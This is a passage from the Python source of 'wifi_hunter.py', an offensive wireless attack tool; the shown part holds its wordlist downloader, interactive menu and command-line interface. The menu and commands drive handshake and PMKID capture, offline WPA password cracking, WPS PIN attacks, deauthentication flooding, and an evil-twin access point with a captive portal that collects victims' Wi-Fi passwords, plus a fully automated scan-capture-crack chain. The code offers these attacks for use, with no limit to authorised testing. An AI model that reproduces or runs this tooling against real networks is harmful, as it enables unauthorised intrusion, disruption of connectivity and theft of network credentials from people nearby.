            if not w or len(w) < 3 or len(w) > 63 or w in seen:
                continue
            seen.add(w)
            lines.append(w)
        p.write_text("\n".join(lines) + "\n", encoding="utf-8")
        written.append(p)
        ok(f"{name}: {len(lines)} words -> {p}")
    return written


def count_lines(p: Path) -> int:
    try:
        with p.open("rb") as f:
            return sum(chunk.count(b"\n") for chunk in iter(lambda: f.read(1 << 20), b""))
    except OSError:
        return 0


def list_available() -> list[dict]:
    rows: list[dict] = []
    for p in sorted(WORDLIST_DIR.glob("*.txt")):
        rows.append({"name": p.stem, "path": p, "lines": count_lines(p), "remote": False})
    if DOWNLOAD_DIR.exists():
        for p in sorted(DOWNLOAD_DIR.glob("*.txt")):
            rows.append({"name": p.stem, "path": p, "lines": count_lines(p), "remote": True})
    for name, (url, group) in REMOTE_LISTS.items():
        if not (DOWNLOAD_DIR / f"{name}.txt").exists():
            rows.append({"name": name, "path": None, "lines": 0, "remote": True, "group": group})
    return rows


def fetch_list(name: str, force: bool = False) -> Path | None:
    if name in REMOTE_GROUPS:
        got = None
        for sub in REMOTE_GROUPS[name]:
            got = fetch_list(sub, force) or got
        return got
    url = REMOTE_LISTS.get(name, (None, ""))[0]
    if not url:
        bad(f"unknown remote list: {name}")
        return None
    DOWNLOAD_DIR.mkdir(parents=True, exist_ok=True)
    dest = DOWNLOAD_DIR / f"{name}.txt"
    if dest.exists() and not force and dest.stat().st_size > 200:
        info(f"{name}: already present ({human(dest.stat().st_size)}B)")
        return dest

    import urllib.request

    tmp = dest.with_suffix(".part")
    req = urllib.request.Request(url, headers={"User-Agent": f"{APP}/{VERSION}"})
    try:
        with urllib.request.urlopen(req, timeout=60) as resp, tmp.open("wb") as out:
            total = int(resp.headers.get("Content-Length") or 0)
            done = 0
            t0 = time.time()
            while True:
                chunk = resp.read(1 << 16)
                if not chunk:
                    break
                out.write(chunk)
                done += len(chunk)
                if total:
                    pct = 100.0 * done / total
                    say(
                        f"\r{col('[*]', C.CYN)} {name}: {pct:5.1f}% "
                        f"{human(done)}/{human(total)} {human(done / max(time.time() - t0, 0.01))}/s   ",
                        end="",
                    )
            say("")
    except Exception as e:  # noqa: BLE001
        tmp.unlink(missing_ok=True)
        bad(f"{name}: download failed ({e})")
        return None
    if tmp.stat().st_size < 200:
        tmp.unlink(missing_ok=True)
        bad(f"{name}: file looks truncated")
        return None
    tmp.replace(dest)
    ok(f"{name}: {count_lines(dest)} words -> {dest}")
    return dest


def resolve_wordlists(spec: str | None) -> list[Path]:
    """'a.txt,curated,wpa' -> list of existing .txt files (sorted, de-duped)."""
    if not spec:
        return []
    paths: list[Path] = []
    tokens: list[str] = []
    for token in re.split(r"[,;]", spec):
        token = token.strip()
        if not token:
            continue
        low = token.lower()
        if low == "builtin":
            continue
        if low == "curated":
            tokens.extend(CURATED_ORDER)
            continue
        if low in ("downloaded", "remote"):
            if DOWNLOAD_DIR.exists():
                paths.extend(sorted(DOWNLOAD_DIR.glob("*.txt")))
            continue
        if low in ("all", "everything"):
            paths.extend(sorted(WORDLIST_DIR.glob("*.txt")))
            if DOWNLOAD_DIR.exists():
                paths.extend(sorted(DOWNLOAD_DIR.glob("*.txt")))
            continue
        tokens.append(token)

    for token in tokens:
        cand = Path(token)
        if cand.is_dir():
            paths.extend(sorted(cand.glob("*.txt")))
            continue
        if cand.is_file():
            paths.append(cand)
            continue
        for candidate in (WORDLIST_DIR / f"{token}.txt", DOWNLOAD_DIR / f"{token}.txt"):
            if candidate.is_file():
                paths.append(candidate)
                break
        else:
            warn(f"wordlist not found: {token}")
    out: list[Path] = []
    seen: set[str] = set()
    for p in paths:
        key = str(p.resolve()).lower()
        if key not in seen:
            seen.add(key)
            out.append(p)
    return out


def cmd_wordlists(args) -> int:
    if args.action in (None, "list"):
        rows = list_available()
        hr("available wordlists")
        table(
            ["NAME", "WORDS", "SOURCE", "STATUS"],
            [[r["name"], human(r["lines"]) if r["lines"] else "-",
              "remote" if r["remote"] else "local",
              "ready" if r["path"] else "not downloaded"] for r in rows],
        )
        say(f"folder: {WORDLIST_DIR}")
        say(col("fetch: ", C.B) + "wifi | common | probable | huge | all | <name>")
        return 0
    if args.action == "build":
        build_curated(args.names or None)
        return 0
    if args.action == "fetch":
        names = args.names or ["wifi"]
        for n in names:
            fetch_list(n, force=args.force)
        return 0
    if args.action == "stats":
        rows = [r for r in list_available() if r["path"]]
        total = sum(r["lines"] for r in rows)
        for r in rows:
            say(f"  {r['name']:18s} {human(r['lines']):>9}")
        say("")
        ok(f"{len(rows)} list(s), {human(total)} words, {human(sum(r['path'].stat().st_size for r in rows))}B on disk")
        return 0
    if args.action == "show":
        if not args.names:
            bad("which list? --names <name>")
            return 1
        path = (WORDLIST_DIR / f"{args.names[0]}.txt")
        if not path.exists():
            path = DOWNLOAD_DIR / f"{args.names[0]}.txt"
        if not path.exists():
            bad(f"no such list: {args.names[0]}")
            return 1
        lines = path.read_text(encoding="utf-8", errors="replace").splitlines()
        for line in lines[: args.limit]:
            say(line)
        info(f"{len(lines)} total")
        return 0
    bad(f"unknown action {args.action}")
    return 1


# --------------------------------------------------------------------------------------
# interactive menu (no switches needed)
# --------------------------------------------------------------------------------------
BANNER = r"""
 __      __.__  __________    __  .__                 __
/  \    /  \__|/  |  \   |  |  | |  |__  __ __  ____ |  | __ ___________
\   \/\/   /  \   |  /   |  |  | |  |  \|  |  \/    \|  |/ // __ \_  __ \
 \        /|  ||    /|   |__|  |_|   Y  \  |  /   |  \    <\  ___/|  | \/
  \__/\  / |__||__| |___|  \____/__|  |__/__|__\___|  /__|_ \\___  >__|
       \/                                           \/      \/    \/
"""

MENU_ITEMS = [
    ("1", "scan", "scan nearby networks"),
    ("2", "sniff", "sniff live / analyze a pcap"),
    ("3", "capture", "capture handshake + PMKID"),
    ("4", "hash", "pcap -> hashes (22000)"),
    ("5", "crack", "crack hashes (wordlists / mask)"),
    ("6", "verify", "test a single password"),
    ("7", "keygen", "router default passwords"),
    ("8", "wps", "WPS attack"),
    ("9", "deauth", "send deauth frames"),
    ("10", "evil", "evil twin + captive portal"),
    ("11", "report", "build HTML report"),
    ("12", "wordlists", "manage wordlists"),
    ("13", "doctor", "check capabilities"),
    ("14", "selftest", "self test"),
    ("15", "all", "full auto chain"),
]


def _defaults_for(cmd: str) -> argparse.Namespace:
    parser = build_parser()
    sub = next(a for a in parser._actions if isinstance(a, argparse._SubParsersAction))
    sp = sub.choices[cmd]
    ns = argparse.Namespace()
    for action in sp._actions:
        if action.dest != "help":
            setattr(ns, action.dest, action.default)
    ns.func = sp.get_default("func")
    return ns


def _ask(label: str, default: str | None = None, required: bool = False) -> str:
    suffix = f" [{default}]" if default else ""
    while True:
        try:
            val = input(f"  {label}{suffix}: ").strip()
        except EOFError:
            raise KeyboardInterrupt
        if not val and default is not None:
            return default
        if val or not required:
            return val
        say("    (required)")


def _ask_int(label: str, default: int = 0, lo: int | None = None, hi: int | None = None) -> int:
    while True:
        raw = _ask(label, str(default))
        try:
            v = int(raw)
        except ValueError:
            say("    (number please)")
            continue
        if lo is not None and v < lo:
            continue
        if hi is not None and v > hi:
            continue
        return v


def _ask_yes(label: str, default: bool = False) -> bool:
    raw = _ask(label + " (y/n)", "y" if default else "n").lower()
    return raw.startswith("y")


def _ask_choice(label: str, options: Sequence[tuple[str, str]], default: str) -> str:
    say(f"  {label}:")
    for key, text in options:
        mark = "*" if key == default else " "
        say(f"   {mark}{key}) {text}")
    keys = {k for k, _ in options}
    while True:
        raw = _ask("choose", default).lower()
        if raw in keys:
            return raw
        say("    (invalid choice)")


def _pick_ap(aps: list[AP], title: str = "choose target") -> AP | None:
    if not aps:
        return None
    if len(aps) == 1:
        return aps[0]
    print_ap_table(aps)
    idx = _ask_int(title, 1, 1, len(aps))
    return aps[idx - 1]


def _estimate(lines: int, rules: Sequence[str]) -> int:
    mult = 1
    if rules:
        mult = max(1, sum(1 for _ in apply_rules("password", rules)))
    return lines * mult


def _choose_wordlists() -> tuple[str, int]:
    rows = [r for r in list_available() if r["path"]]
    say("")
    hr("wordlists")
    if rows:
        for i, r in enumerate(rows, 1):
            tag = col("downloaded", C.YEL) if r["remote"] else "local"
            say(f"  {i:>2}) {r['name']:20s} {human(r['lines']):>8} words  ({tag})")
    else:
        warn("no lists on disk yet - use option f to download")
    missing = [r["name"] for r in list_available() if not r["path"]]
    if missing:
        say(col("  missing/downloadable: ", C.DIM) + ", ".join(missing[:8]) + (" ..." if len(missing) > 8 else ""))

    options = [("c", f"curated (local lists, {human(sum(r['lines'] for r in rows if not r['remote']))} words)"),
               ("b", "builtin (small internal list)")]
    if rows:
        options.insert(0, ("d", "downloaded lists"))
    options += [("f", "fetch more lists"), ("x", "manual path")]

    choice = _ask_choice("source", options, "c" if rows else "b")
    if choice == "b":
        return "builtin", len(BUILTIN_WORDS)
    if choice == "f":
        name = _ask("which (wifi/common/probable/all/huge)", "wifi")
        fetch_list(name)
        return _choose_wordlists()
    if choice == "x":
        spec = _ask("path(s), comma separated", required=True)
        paths = resolve_wordlists(spec)
        return spec, sum(count_lines(p) for p in paths)
    if choice == "d":
        paths = [r["path"] for r in rows if r["remote"]]
        return ",".join(str(p) for p in paths), sum(r["lines"] for r in rows if r["remote"])

    picked = _ask("numbers (e.g. 1,3) or 'all'", "all")
    if picked.lower() in ("all", ""):
        paths = [r["path"] for r in rows if not r["remote"]]
    else:
        idxs = [int(x) for x in re.split(r"[,\s]+", picked) if x.isdigit()]
        paths = [rows[i - 1]["path"] for i in idxs if 1 <= i <= len(rows)]
    if not paths:
        warn("nothing picked, falling back to builtin")
        return "builtin", len(BUILTIN_WORDS)
    return ",".join(str(p) for p in paths), sum(count_lines(p) for p in paths)


def _guarded(fn) -> None:
    try:
        fn()
    except KeyboardInterrupt:
        say("")
        warn("cancelled")
    except SystemExit:
        pass
    except Exception as e:  # noqa: BLE001
        bad(f"{type(e).__name__}: {e}")
    say("")
    try:
        input(col("  press Enter to return to menu ", C.DIM))
    except (EOFError, KeyboardInterrupt):
        raise KeyboardInterrupt


# ---------------------------------- actions ----------------------------------
def _m_scan() -> None:
    ns = _defaults_for("scan")
    ns.source = _ask_choice("backend", [("auto", "auto"), ("termux", "termux-api (android)"),
                                        ("netsh", "netsh (windows)"),
                                        ("nmcli", "nmcli (linux)"), ("pywifi", "pywifi")], "auto")
    ns.min_signal = _ask_int("min signal %", 0, 0, 100)
    ns.json = _ask("save to json", out("scan.json"))
    aps = _pick_or_scan(ns)
    del aps


def _pick_or_scan(ns) -> list[AP]:
    aps = _filter_aps(scan_aps(ns.source, ns.iface), ns)
    print_ap_table(aps)
    if ns.json and aps:
        p = Path(ns.json)
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(json.dumps({"host": platform.node(), "ts": time.time(),
                                 "aps": [a.to_dict() for a in aps]}, indent=2, ensure_ascii=False),
                     encoding="utf-8")
        ok(f"saved {len(aps)} network(s) -> {p}")
    return aps


def _m_sniff() -> None:
    mode = _ask_choice("mode", [("l", "live capture"), ("f", "analyze a pcap file")], "l")
    if mode == "f":
        ns = _defaults_for("sniff")
        ns.pcap = _ask("pcap path", required=True)
        ns.top = _ask_int("how many probes to show", 15, 1, 200)
        _print_capture_summary(analyze_pcap(ns.pcap), ns)
        return
    if not require_scapy():
        return
    ns = _defaults_for("sniff")
    ns.seconds = _ask_int("seconds", 30, 1, 3600)
    ns.channel = _ask_int("channel (0 = no change)", 0, 0, 200)
    ns.monitor = _ask_yes("switch to monitor mode first")
    ns.out = _ask("output dir", str(OUTDIR))
    cmd_sniff(ns)


def _m_capture() -> None:
    ns = _defaults_for("capture")
    source = _ask_choice("source", [("l", "live"), ("p", "from pcap")], "l")
    if source == "p":
        ns.pcap = _ask("pcap path", required=True)
        ns.ssid = _ask("ssid override (blank = from beacon)", "")
        targets = _capture_targets(ns)
    else:
        ns.monitor = _ask_yes("switch to monitor mode")
        if not require_scapy():
            return
        scan = _ask_yes("scan first to pick target", True)
        if scan:
            aps = [a for a in scan_aps() if a.sec != "OPEN"]
            pick = _pick_ap(aps)
            if not pick:
                return
            ns.bssid = pick.bssid
            ns.channel = pick.channel
            ns.ssid = pick.ssid
            info(f"target: {pick.ssid or '<hidden>'} ch{pick.channel}")
        else:
            ns.bssid = _ask("bssid", required=True)
            ns.channel = _ask_int("channel", 0)
        ns.client = _ask("client mac (blank = broadcast)", "")
        ns.timeout = _ask_int("capture seconds", 45, 5, 3600)
        ns.deauth = _ask_yes("send deauth to force reconnects")
        ns.out = _ask("output dir", str(OUTDIR))
        targets = _capture_targets(ns)
    if not targets:
        warn("nothing captured")
        return
    stem = Path(ns.out or OUTDIR) / f"captured-{int(time.time())}"
    for p in save_targets(targets, stem):
        say(f"  -> {p}")
    ok(f"{len(targets)} hash(es) saved: {stem.with_suffix('.22000')}")
    if _ask_yes("crack them now", True):
        _crack_file(str(stem.with_suffix(".22000")))


def _m_hash() -> None:
    ns = _defaults_for("hash")
    ns.pcap = _ask("pcap path", required=True)
    ns.out = _ask("output stem", str(Path(ns.pcap).with_suffix("")))
    cmd_hash(ns)


def _crack_file(prefill: str | None = None) -> None:
    ns = _defaults_for("crack")
    ns.input = _ask("hash file (.22000/.json)", prefill or "")
    if not ns.input:
        ns.pcap = _ask("or pcap path", "")
        if not ns.pcap:
            warn("need a hash file or pcap")
            return
    spec, lines = _choose_wordlists()
    ns.wordlist = spec
    ns.rules = _ask_choice("rules", [("1", "none"), ("2", "basic"), ("3", "medium"), ("4", "best")], "2")
    ns.rules = {"1": None, "2": "basic", "3": "medium", "4": "best"}[ns.rules]
    ns.mask = _ask("mask instead of wordlist (e.g. ?u?l?l?l?l?l?d?d, blank = no)", "")
    ns.workers = _ask_int("workers", 0, 0, 64)
    ns.out = _ask("save results to", out("found.json"))
    ns.pot = out("pot.jsonl")
    ns.quiet = False

    from_mask = mask_keyspace(ns.mask) if ns.mask else _estimate(lines, resolve_rules(ns.rules))
    info(f"keyspace ~ {human(from_mask)}")
    if from_mask > 50_000_000:
        warn("this is big for pure python - hashcat would be ~1000x faster")
    if not _ask_yes("start", True):
        return
    cmd_crack(ns)


def _m_crack() -> None:
    _crack_file()


def _m_verify() -> None:
    ns = _defaults_for("verify")
    ns.input = _ask("hash file", required=True)
    ns.password = _ask("password", required=True)
    cmd_verify(ns)


def _m_keygen() -> None:
    ns = _defaults_for("keygen")
    ns.mac = _ask("target bssid/mac", required=True)
    ns.ssid = _ask("ssid", "")
    ns.limit = _ask_int("max candidates", 400, 10, 5000)
    ns.out = _ask("save to file", out(f"keygen-{re.sub(r'[^0-9a-f]', '', ns.mac.lower())[-6:]}.txt"))
    ns.test = _ask("hash file to test against (blank = no)", "")
    cmd_keygen(ns)


def _m_wps() -> None:
    ns = _defaults_for("wps")
    if _ask_yes("list WPS-enabled APs", True):
        rows = wps_scan(wifi_iface_name() or "wlan0")
        table(["BSSID", "CH", "RSSI", "WPS", "LOCK", "SSID"],
              [[r.get("bssid", ""), r.get("channel", ""), r.get("rssi", ""), r.get("wps", ""),
                r.get("lock", ""), r.get("ssid", "")] for r in rows])
        if not rows:
            return
    ns.bssid = _ask("target bssid", required=True)
    ns.ssid = _ask("ssid", "")
    ns.channel = _ask_int("channel", 6, 1, 200)
    ns.pixie = _ask_yes("pixie-dust (fast, no lockout)", True)
    ns.limit = _ask_int("max pins", 60, 1, 500)
    ns.total_timeout = _ask_int("total timeout sec", 3600, 60, 86400)
    if _ask_yes("show candidate pins first", True):
        for p in wps_pins(ns.bssid, ns.ssid, limit=10):
            say(f"   {p}")
    cmd_wps(ns)


def _m_deauth() -> None:
    ns = _defaults_for("deauth")
    aps = scan_aps()
    pick = _pick_ap([a for a in aps if a.sec != "OPEN"])
    ns.bssid = pick.bssid if pick else _ask("bssid", required=True)
    ns.channel = pick.channel if pick else 0
    ns.client = _ask("client mac (blank = broadcast)", "")
    ns.count = _ask_int("frames", 16, 1, 5000)
    ns.interval = 0.15
    ns.monitor = _ask_yes("switch to monitor mode")
    cmd_deauth(ns)


def _m_evil() -> None:
    ns = _defaults_for("evil")
    aps = [a for a in scan_aps() if a.sec != "OPEN"]
    pick = _pick_ap(aps, "clone which network")
    ns.ssid = pick.ssid if pick else _ask("ssid", required=True)
    ns.bssid = pick.bssid if pick else _ask("bssid", "")
    ns.channel = pick.channel if pick else 6
    ns.hashes = _ask("hash file for auto-verify (blank = no)", "")
    ns.serve = _ask_yes("also start hostapd/dnsmasq", True)
    ns.deauth = _ask_yes("flood deauth so clients come to you", True)
    ns.port = _ask_int("portal port", 80, 1, 65535)
    ns.seconds = _ask_int("stop after seconds (0 = until valid password)", 0)
    ns.out = out("evil")
    cmd_evil(ns)


def _m_report() -> None:
    ns = _defaults_for("report")
    ns.scan = _ask("scan json", out("scan.json"))
    found = _ask("found json/pot (blank = none)", out("found.json"))
    ns.found = [found] if found else None
    ns.out = _ask("output html", out(f"report-{int(time.time())}.html"))
    cmd_report(ns)


def _m_wordlists() -> None:
    act = _ask_choice("action", [("l", "list"), ("f", "fetch (download)"), ("b", "rebuild curated"),
                                 ("s", "stats"), ("v", "view")], "l")
    args = argparse.Namespace(action={"l": "list", "f": "fetch", "b": "build",
                                     "s": "stats", "v": "show"}[act],
                              names=None, force=False, limit=30)
    if act == "f":
        args.names = [_ask("which (wifi/common/probable/all/huge)", "wifi")]
    if act == "v":
        args.names = [_ask("list name", required=True)]
    cmd_wordlists(args)


def _m_doctor() -> None:
    cmd_doctor(argparse.Namespace(iface=None))


def _m_selftest() -> None:
    cmd_selftest(argparse.Namespace(keep=False, out=None))


def _m_all() -> None:
    ns = _defaults_for("all")
    ns.min_signal = _ask_int("min signal %", 30, 0, 100)
    ns.sec = "WPA2,WPA3,WPA,WEP"
    ns.limit = _ask_int("max networks to consider", 10, 1, 100)
    ns.target = None
    ns.timeout = _ask_int("capture seconds", 60, 5, 3600)
    ns.workers = _ask_int("workers", 0, 0, 64)
    ns.wordlist = "curated"
    ns.out = _ask("output dir", str(OUTDIR))
    cmd_all(ns)


ACTIONS = {
    "1": _m_scan, "2": _m_sniff, "3": _m_capture, "4": _m_hash, "5": _m_crack,
    "6": _m_verify, "7": _m_keygen, "8": _m_wps, "9": _m_deauth, "10": _m_evil,
    "11": _m_report, "12": _m_wordlists, "13": _m_doctor, "14": _m_selftest, "15": _m_all,
}


def menu() -> int:
    if IS_WIN:
        for stream in (sys.stdout, sys.stderr):
            try:
                stream.reconfigure(encoding="utf-8", errors="replace")
            except Exception:
                pass
    ansi_setup()
    iface = wifi_iface_name()
    narrow = term_cols() < 64
    while True:
        if narrow:
            say(col(f"{APP} v{VERSION}", C.CYN))
        else:
            say(col(BANNER, C.CYN))
        say(f"  iface: {iface or 'none'}  cwd: {Path.cwd()}")
        hr(width=max(34, term_cols() - 2))
        for key, _cmd, text in MENU_ITEMS:
            say(f"{col(key.rjust(2), C.B)}) {text}")
        say(f"{col(' 0', C.B)}) exit")
        hr(width=max(34, term_cols() - 2))
        try:
            choice = input(col("select: ", C.GRN)).strip().lower()
        except (EOFError, KeyboardInterrupt):
            say("")
            return 0
        say("")
        if choice in ("0", "q", "exit"):
            say("bye.")
            return 0
        fn = ACTIONS.get(choice)
        if not fn:
            warn("invalid choice")
            continue
        try:
            _guarded(fn)
        except KeyboardInterrupt:
            say("")
            return 0

# --------------------------------------------------------------------------------------
# CLI
# --------------------------------------------------------------------------------------
def add_scan_opts(p: argparse.ArgumentParser) -> None:
    p.add_argument("--source", default="auto", choices=["auto", "netsh", "termux", "nmcli", "iw", "airport", "pywifi"],
                   help="scan backend (default auto)")
    p.add_argument("--iface", help="wireless interface name")
    p.add_argument("--min-signal", type=int, default=0, metavar="PCT", help="drop networks below this signal")
    p.add_argument("--sec", help="only these security types, comma separated (WPA2,WPA3,OPEN,WEP)")
    p.add_argument("--filter", dest="ssid", metavar="REGEX", help="only SSIDs matching this regex")
    p.add_argument("--limit", type=int, default=0, help="max rows")
    p.add_argument("--open-only", action="store_true")
    p.add_argument("--no-vendor", action="store_true")
    p.add_argument("--json", metavar="FILE", help="append results to a JSON scan file")
    p.add_argument("--watch", type=float, default=0, metavar="SEC", help="rescan every N seconds")


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="wifi_hunter.py",
        description=f"{APP} v{VERSION} - scan, capture, crack, attack. stdlib only core.",
        epilog="""run without arguments for the interactive menu:
  wifi_hunter.py
  wifi_hunter.py menu

examples:
  wifi_hunter.py scan
  wifi_hunter.py scan --json out/scan.json
  wifi_hunter.py capture -b AA:BB:CC:DD:EE:FF -c 6 --deauth -t 60
  wifi_hunter.py hash --pcap dump.pcapng -o out/hashes
  wifi_hunter.py crack -i out/hashes.22000 -w rockyou.txt --rules best
  wifi_hunter.py crack -i out/hashes.22000 --mask '?u?l?l?l?l?d?d?d'
  wifi_hunter.py keygen --mac AA:BB:CC:DD:EE:FF --ssid Home --test out/hashes.22000
  wifi_hunter.py deauth -b AA:BB:CC:DD:EE:FF --channel 6 --count 32
  wifi_hunter.py evil --ssid Home --bssid AA:BB:CC:DD:EE:FF --hashes out/hashes.22000 --serve
  wifi_hunter.py report --scan out/scan.json --found out/found.json
  wifi_hunter.py doctor
  wifi_hunter.py selftest
""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("-v", "--verbose", action="store_true")
    sub = p.add_subparsers(dest="cmd", required=False)

    s = sub.add_parser("scan", help="list nearby networks")
    add_scan_opts(s)
    s.set_defaults(func=cmd_scan)

    s = sub.add_parser("sniff", help="live capture / pcap analysis with stats")
    s.add_argument("--iface")
    s.add_argument("--pcap", help="analyze a pcap/pcapng instead of capturing")
    s.add_argument("--seconds", type=float, default=30)
    s.add_argument("--channel", type=int, default=0)
    s.add_argument("--monitor", action="store_true", help="switch adapter to monitor mode first")
    s.add_argument("--out", help="output directory")
    s.add_argument("--top", type=int, default=15)
    s.set_defaults(func=cmd_sniff)

    s = sub.add_parser("capture", help="capture handshakes / PMKIDs")
    s.add_argument("-i", "--iface")
    s.add_argument("-b", "--bssid")
    s.add_argument("-c", "--client", help="target client MAC (default broadcast)")
    s.add_argument("--channel", type=int, default=0)
    s.add_argument("-t", "--timeout", type=float, default=45)
    s.add_argument("-o", "--out", help="output directory")
    s.add_argument("--pcap", help="extract from a pcap instead of capturing")
    s.add_argument("--ssid", help="force SSID (needed for hidden networks)")
    s.add_argument("--monitor", action="store_true")
    s.add_argument("--hop", action="store_true", help="hop channels while capturing")
    s.add_argument("--deauth", action="store_true", help="send deauth to force reconnects")
    s.add_argument("--allow-hidden", action="store_true")
    s.set_defaults(func=cmd_capture)

    s = sub.add_parser("hash", help="pcap -> 22000 hashes")
    s.add_argument("--pcap", required=True)
    s.add_argument("-o", "--out")
    s.add_argument("--ssid")
    s.add_argument("-b", "--bssid")
    s.add_argument("--allow-hidden", action="store_true")
    s.set_defaults(func=cmd_hash)

    s = sub.add_parser("crack", help="offline dictionary / mask / bruteforce attack")
    s.add_argument("-i", "--input", help="22000 or json hash file")
    s.add_argument("--pcap", help="extract hashes from pcap on the fly")
    s.add_argument(
        "-w", "--wordlist",
        help="wordlist name(s) or paths, comma separated; keywords: curated, all, downloaded, "
             "builtin, " + ", ".join(CURATED_ORDER + list(REMOTE_LISTS)),
    )
    s.add_argument("-r", "--rules", help="rules or preset: basic|medium|best|all or a,b,c")
    s.add_argument("--mask", help="mask, e.g. '?u?l?l?l?l?d?d?d'")
    s.add_argument("-1", "--custom1")
    s.add_argument("-2", "--custom2")
    s.add_argument("-3", "--custom3")
    s.add_argument("-4", "--custom4")
    s.add_argument("--bruteforce", metavar="CHARSET", help="charset name (d,l,u,s,a) or literal charset")
    s.add_argument("--min-len", type=int, default=8)
    s.add_argument("--max-len", type=int, default=10)
    s.add_argument("-j", "--workers", type=int, default=0, help="processes (default: cpu count)")
    s.add_argument("--pot", default=out("pot.jsonl"), help="potfile (resume + no duplicates)")
    s.add_argument("--chunk-size", type=int, default=400)
    s.add_argument("-o", "--out", help="write recovered passwords to JSON")
    s.add_argument("--list-rules", action="store_true")
    s.add_argument("--quiet", action="store_true")
    s.add_argument("--ssid", dest="ssid_target", help="only targets whose SSID matches regex")
    s.set_defaults(func=cmd_crack)

    s = sub.add_parser("verify", help="test one password against hashes")
    s.add_argument("-i", "--input", required=True)
    s.add_argument("-p", "--password", required=True)
    s.add_argument("--ssid", dest="ssid_target")
    s.set_defaults(func=cmd_verify)

    s = sub.add_parser("wps", help="WPS PIN attacks")
    s.add_argument("-i", "--iface")
    s.add_argument("-b", "--bssid")
    s.add_argument("--ssid")
    s.add_argument("--channel", type=int, default=0)
    s.add_argument("--scan", action="store_true", help="list WPS-enabled APs")
    s.add_argument("--pin", help="try only this PIN")
    s.add_argument("--list-pins", action="store_true", help="print candidate PINs")
    s.add_argument("--limit", type=int, default=60)
    s.add_argument("--pixie", action="store_true", help="pixie-dust (offline, fastest)")
    s.add_argument("--pin-timeout", type=int, default=180)
    s.add_argument("--total-timeout", type=int, default=3600)
    s.add_argument("-o", "--out")
    s.set_defaults(func=cmd_wps)

    s = sub.add_parser("deauth", help="send deauthentication frames")
    s.add_argument("-i", "--iface")
    s.add_argument("-b", "--bssid", required=True)
    s.add_argument("-c", "--client", default="ff:ff:ff:ff:ff:ff")
    s.add_argument("--channel", type=int, default=0)
    s.add_argument("--count", type=int, default=16)
    s.add_argument("--interval", type=float, default=0.15)
    s.add_argument("--reason", type=int, default=7)
    s.add_argument("--monitor", action="store_true")
    s.add_argument("--backend", default="auto", choices=["auto", "scapy", "npcap", "packet"])
    s.set_defaults(func=cmd_deauth)

    s = sub.add_parser("evil", help="evil twin + captive portal")
    s.add_argument("--ssid", required=True)
    s.add_argument("--bssid")
    s.add_argument("--channel", type=int, default=6)
    s.add_argument("--iface")
    s.add_argument("--iface2", help="second adapter for the fake AP (defaults to --iface)")
    s.add_argument("--hashes", help="hashes used to verify submitted passwords")
    s.add_argument("--ssid-target", dest="ssid_target", help="only verify against hashes of this SSID regex")
    s.add_argument("--bind", default="0.0.0.0")
    s.add_argument("--port", type=int, default=80)
    s.add_argument("--out")
    s.add_argument("--found")
    s.add_argument("--serve", action="store_true", help="also start hostapd + dnsmasq")
    s.add_argument("--deauth", action="store_true", help="flood deauth so clients reconnect")
    s.add_argument("--deauth-interval", type=float, default=5)
    s.add_argument("--seconds", type=float, default=0)
    s.set_defaults(func=cmd_evil)

    s = sub.add_parser("keygen", help="default/MAC-derived password candidates")
    s.add_argument("--mac", required=True)
    s.add_argument("--ssid")
    s.add_argument("--vendor")
    s.add_argument("--limit", type=int, default=400)
    s.add_argument("--pattern", help="extra template, {mac} {last6} {last4} {ssid}")
    s.add_argument("--test", help="verify candidates against a hash file")
    s.add_argument("-o", "--out")
    s.add_argument("--show-all", action="store_true", help="print every candidate even with -o")
    s.set_defaults(func=cmd_keygen)

    s = sub.add_parser("wordlists", help="list / fetch / build wordlists")
    s.add_argument("action", nargs="?", default="list",
                   choices=["list", "fetch", "build", "stats", "show"])
    s.add_argument("names", nargs="*", help="names, or a group: wifi, common, probable, all, huge")
    s.add_argument("--force", action="store_true", help="re-download even if present")
    s.add_argument("--limit", type=int, default=30)
    s.set_defaults(func=cmd_wordlists)

    s = sub.add_parser("report", help="build HTML report")
    s.add_argument("--scan", help="scan json")
    s.add_argument("--found", nargs="+", help="found.json / pot.jsonl")
    s.add_argument("-o", "--out")
    s.set_defaults(func=cmd_report)

    s = sub.add_parser("doctor", help="check capabilities")
    s.add_argument("--iface")
    s.set_defaults(func=cmd_doctor)

    s = sub.add_parser("selftest", help="verify crypto and parsing")
    s.add_argument("--keep", action="store_true")
    s.add_argument("--out")
    s.set_defaults(func=cmd_selftest)

    s = sub.add_parser("all", help="scan -> capture -> crack -> report")
    add_scan_opts(s)
    s.add_argument("--target", type=int, help="index from the scan result (default: strongest)")
    s.add_argument("-t", "--timeout", type=float, default=60)
    s.add_argument("-j", "--workers", type=int, default=0)
    s.add_argument("-w", "--wordlist")
    s.add_argument("-o", "--out", default=str(OUTDIR))
    s.set_defaults(func=cmd_all)

    s = sub.add_parser("menu", help="interactive menu (default when no command is given)")
    s.set_defaults(func=lambda _a: menu())

    return p


def main(argv: Sequence[str] | None = None) -> int:
    ansi_setup()
    parser = build_parser()
    args = parser.parse_args(argv)
    OUTDIR.mkdir(parents=True, exist_ok=True)
    if getattr(args, "cmd", None) is None:
        return menu()
    try:
        res = args.func(args)
        return res if isinstance(res, int) else 0
    except KeyboardInterrupt:
        say("")
        warn("interrupted")
        return 130
    except BrokenPipeError:
        return 0


if __name__ == "__main__":
    sys.exit(main())
